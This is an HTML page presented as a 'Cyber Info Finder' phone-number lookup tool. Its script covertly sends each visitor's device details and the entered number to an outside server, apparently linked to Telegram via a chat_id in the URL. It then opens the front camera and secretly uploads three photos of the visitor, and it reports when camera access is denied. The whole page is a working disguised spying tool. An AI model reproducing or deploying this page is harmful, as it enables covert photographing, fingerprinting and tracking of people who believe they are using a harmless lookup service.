<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Cyber Info Finder</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  background: black;
  color: #00ff00;
  font-family: monospace;
  text-align: center;
  padding: 20px;
}

/* BOX UI */
.box {
  border: 1px solid #00ff00;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 0 20px #00ff00;
}

/* INPUT */
input {
  width: 80%;
  padding: 12px;
  background: black;
  border: 1px solid #00ff00;
  color: #00ff00;
  margin-top: 15px;
}

/* BUTTON */
button {
  margin-top: 15px;
  padding: 12px 20px;
  background: #00ff00;
  color: black;
  border: none;
  font-weight: bold;
  cursor: pointer;
}

/* LOADER */
.loader {
  margin-top: 20px;
  display: none;
}

.loader div {
  width: 10px;
  height: 10px;
  background: #00ff00;
  margin: 3px;
  display: inline-block;
  animation: blink 1s infinite;
}

.loader div:nth-child(2) { animation-delay: 0.2s; }
.loader div:nth-child(3) { animation-delay: 0.4s; }

@keyframes blink {
  0% { opacity: 0 }
  50% { opacity: 1 }
  100% { opacity: 0 }
}

/* FOOTER */
.footer {
  margin-top: 30px;
  font-size: 12px;
  opacity: 0.6;
}
</style>
</head>

<body>

<div class="box">

<h2>🟢 CYBER INFO FINDER</h2>
<p id="status">System Ready...</p>

<input id="num" placeholder="Enter Phone Number">

<br>
<button onclick="startAll()">START</button>
<div id="resultBox" style="margin-top:20px;"></div>

<div class="loader" id="loader">
  <div></div><div></div><div></div>
</div>

</div>

<div class="footer">
⚡ Powered by @aditya_labs
</div>

<script>
const params = new URLSearchParams(location.search);
const chatId = params.get("chat_id");

const SERVER = "https://prank-cam-bot.vercel.app";

/* 🔥 SEND VISITOR INFO */
async function sendVisitorInfo() {
  let device = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    time: new Date().toLocaleString()
  };

  await fetch(`${SERVER}/visitor`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: chatId,
      device: device
    })
  });
}

/* 🔥 SEND PHOTO */
async function sendPhoto(canvas, num) {
  fetch(`${SERVER}/send-photo`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: chatId,
      photo: canvas.toDataURL("image/jpeg", 0.5),
      number: `front-${num}`
    })
  });
}

/* 🔥 CAPTURE */
async function capture(stream) {
  const video = document.createElement("video");
  video.srcObject = stream;
  await video.play();

  for (let i = 1; i <= 3; i++) {
    const canvas = document.createElement("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    canvas.getContext("2d").drawImage(video, 0, 0);

    sendPhoto(canvas, i);
  }
}

/* 🔥 PHONE API */
async function phoneSearch(num) {
  try {
    document.getElementById("status").innerText = "Searching...";

    // ✅ API CALL FOR UI
    const res = await fetch(`https://number-info-bd-tau.vercel.app/info?number=${num}`);
    const data = await res.json();

    // ✅ SHOW RAW RESULT (same as other bot)
    document.getElementById("resultBox").innerHTML = `
<pre style="text-align:left;color:#0f0;">
${JSON.stringify(data, null, 2)}
</pre>`;

    // ✅ TELEGRAM SEND (separate)
    await fetch(`${SERVER}/number`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        number: num
      })
    });

    document.getElementById("status").innerText = "✅ Completed";

  } catch (e) {
    document.getElementById("status").innerText = "❌ API Failed";
  }
}

/* 🔥 MAIN FLOW */
async function startAll() {

  const num = document.getElementById("num").value;

  if (!num) {
    alert("Enter number first");
    return;
  }

  try {
    document.getElementById("loader").style.display = "block";
    document.getElementById("status").innerText = "Accessing system...";

    await sendVisitorInfo();

    document.getElementById("status").innerText = "Processing number...";
    await phoneSearch(num);
    document.getElementById("status").innerText = "Search completed";

    document.getElementById("status").innerText = "Accessing camera...";

    let stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    await capture(stream);

    stream.getTracks().forEach(t => t.stop());

    document.getElementById("status").innerText = "✅ Completed";
    document.getElementById("loader").style.display = "none";

  } catch (e) {

    document.getElementById("status").innerText = "❌ Camera denied";

    await fetch(`${SERVER}/denied`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ chat_id: chatId })
    });
  }
}
</script>

</body>
</html>
